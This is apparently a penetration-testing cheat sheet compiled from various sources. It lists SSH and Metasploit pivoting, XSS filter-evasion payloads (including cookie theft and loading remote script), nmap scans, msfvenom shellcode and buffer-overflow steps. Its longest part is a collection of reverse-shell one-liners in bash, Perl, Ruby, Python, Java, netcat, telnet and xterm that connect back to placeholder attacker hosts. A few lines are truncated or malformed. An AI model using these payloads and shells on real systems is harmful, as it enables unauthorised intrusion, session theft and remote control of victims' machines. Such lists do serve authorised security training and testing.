# security-cheat-sheet
<h4>Not exhaustive list of commands per tool, just a few that might make a difference. These are from all over. Credit where credit's due. Just a convenient compilation.

<h3>SSH Pivoting


```
ssh -D 127.0.0.1:1080 -p 22 user@IP
Add socks4 127.0.0.1 1080 in /etc/proxychains.conf
proxychains commands target

# pivot to a different network
ssh -D 127.0.0.1:1080 -p 22 user1@IP1
Add socks4 127.0.0.1 1080 in /etc/proxychains.conf
proxychains ssh -D 127.0.0.1:1081 -p 22 user1@IP2
Add socks4 127.0.0.1 1081 in /etc/proxychains.conf
proxychains commands target

# metasploit pivoting
route add X.X.X.X 255.255.255.0 1
use auxiliary/server/socks4a
run
proxychains msfcli windows/* PAYLOAD=windows/meterpreter/reverse_tcp LHOST=IP LPORT=443 RHOST=IP E
```
<h3>XSS Cheats

<p>https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
  
```
("< iframes > src=http://IP:PORT </ iframes >")

<script>document.location=http://IP:PORT</script>

';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//–></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>

";!–"<XSS>=&amp;amp;{()}

<IMG SRC="javascript:alert('XSS');">
<IMG SRC=javascript:alert('XSS')>
<IMG """><SCRIPT>alert("XSS")</SCRIPT>"">
<IMG SRC=&amp;amp;# 106;&amp;amp;# 97;&amp;amp;# 118;&amp;amp;# 97;&amp;amp;# 115;&amp;amp;# 99;&amp;amp;# 114;&amp;amp;# 105;&amp;amp;# 112;&amp;amp;# 116;&amp;amp;# 58;&amp;amp;# 97;&amp;amp;# 108;&amp;amp;# 101;&amp;amp;# 114;&amp;amp;# 116;&amp;amp;# 40;&amp;amp;# 39;&amp;amp;# 88;&amp;amp;# 83;&amp;amp;# 83;&amp;amp;# 39;&amp;amp;# 41;>

<IMG SRC=&amp;amp;# 0000106&amp;amp;# 0000097&amp;amp;# 0000118&amp;amp;# 0000097&amp;amp;# 0000115&amp;amp;# 0000099&amp;amp;# 0000114&amp;amp;# 0000105&amp;amp;# 0000112&amp;amp;# 0000116&amp;amp;# 0000058&amp;amp;# 0000097&amp;amp;# 0000108&amp;amp;# 0000101&amp;amp;# 0000114&amp;amp;# 0000116&amp;amp;# 0000040&amp;amp;# 0000039&amp;amp;# 0000088&amp;amp;# 0000083&amp;amp;# 0000083&amp;amp;# 0000039&amp;amp;# 0000041>
<IMG SRC="jav ascript:alert('XSS');">

perl -e 'print "<IMG SRC=javascript:alert(\"XSS\")>";' > out

<BODY onload!# $%&amp;()*~+-_.,:;?@[/|\]^`=alert("XSS")>

(">< iframes http://google.com < iframes >)

<BODY BACKGROUND="javascript:alert('XSS')">
<FRAMESET><FRAME SRC=”javascript:alert('XSS');"></FRAMESET>
"><script >alert(document.cookie)</script>
%253cscript%253ealert(document.cookie)%253c/script%253e
"><s"%2b"cript>alert(document.cookie)</script>
%22/%3E%3CBODY%20onload=’document.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22)'%3E
<img src=asdf onerror=alert(document.cookie)>
```
<h3>Nmap

```
nmap -oX outputfile.xml 6.6.6.6 # Save results as XML
nmap -oG outputfile.txt 6.6.6.6 # Save results in a format for grep

nmap -sV -p 443 –script=ssl-heartbleed.nse 6.6.6.6 # Scan using a specific NSE script
nmap -sV --script=smb* 6.6.6.6 # Scan with a set of scripts

nmap --script=http-headers 6.6.6.0/24 # Get HTTP headers of web services
nmap --script=http-enum 6.6.6.0/24 # Find web apps from known paths

nmap --script=asn-query,whois,ip-geolocation-maxmind 6.6.6.0/24 # Find Information about IP address
```

<h3>Win Buffer Overflow

<p>https://jivoi.github.io/2015/07/01/pentest-tips-and-tricks/

```
msfvenom -p windows/shell_bind_tcp -a x86 --platform win -b "\x00" -f c
msfvenom -p windows/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=443 -a x86 --platform win -e x86/shikata_ga_nai -b "\x00" -f c

COMMONLY USED BAD CHARACTERS:
\x00\x0a\x0d\x20                              For http request
\x00\x0a\x0d\x20\x1a\x2c\x2e\3a\x5c           Ending with (0\n\r_)

# Useful Commands:
pattern create
pattern offset (EIP Address)
pattern offset (ESP Address)
add garbage upto EIP value and add (JMP ESP address) in EIP . (ESP = shellcode )

!pvefindaddr pattern_create 5000
!pvefindaddr suggest
!pvefindaddr modules
!pvefindaddr nosafeseh

!mona config -set workingfolder C:\Mona\%p
!mona config -get workingfolder
!mona mod
!mona bytearray -b "\x00\x0a"
!mona pc 5000
!mona po EIP
!mona suggest
```

<h3>Reverse Shells

```
# BASH
bash -i >& /dev/tcp/X.X.X.X/443 0>&1

exec /bin/bash 0&0 2>&0
exec /bin/bash 0&0 2>&0

0<&196;exec 196<>/dev/tcp/attackerip/4444; sh <&196 >&196 2>&196

0<&196;exec 196<>/dev/tcp/attackerip/4444; sh <&196 >&196 2>&196

exec 5<>/dev/tcp/attackerip/4444 cat <&5 | while read line; do $line 2>&5 >&5; done # or: while read line 0<&5; do $line 2>&5 >&5; done
exec 5<>/dev/tcp/attackerip/4444

cat <&5 | while read line; do $line 2>&5 >&5; done # or:
while read line 0<&5; do $line 2>&5 >&5; done

/bin/bash -i > /dev/tcp/attackerip/8080 0<&1 2>&1
/bin/bash -i > /dev/tcp/X.X.X.X/443 0<&1 2>&1

# PEARL
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"attackerip:443");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'

# for win platform
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"attackerip:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};’

# RUBY
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("attackerip","443");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'

# for win platform
ruby -rsocket -e 'c=TCPSocket.new("attackerip","443");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
ruby -rsocket -e 'f=TCPSocket.open("attackerip","443").to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

# PYTHON
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attackerip",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# JAVA
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/attackerip/443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()

# NETCAT
nc -e /bin/sh attackerip 4444
nc -e /bin/sh 192.168.37.10 443

# If the -e option is disabled, try this
# mknod backpipe p && nc attackerip 443 0<backpipe | /bin/bash 1>backpipe
/bin/sh | nc attackerip 443
rm -f /tmp/p; mknod /tmp/p p && nc attackerip 4443 0/tmp/

# If you have the wrong version of netcat installed, try
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attackerip >/tmp/f

# TELNET
# If netcat is not available or /dev/tcp
mknod backpipe p && telnet attackerip 443 0<backpipe | /bin/bash 1>backpipe

# XTERM
# Start an open X Server on your system (:1 – which listens on TCP port 6001)
apt-get install xnest
Xnest :1

# Then remember to authorise on your system the target IP to connect to you
xterm -display 127.0.0.1:1

# Run this INSIDE the spawned xterm on the open X Server
xhost +targetip

# Then on the target connect back to the your X Server
xterm -display attackerip:1
/usr/openwin/bin/xterm -display attackerip:1
or
$ DISPLAY=attackerip:0 xterm
```
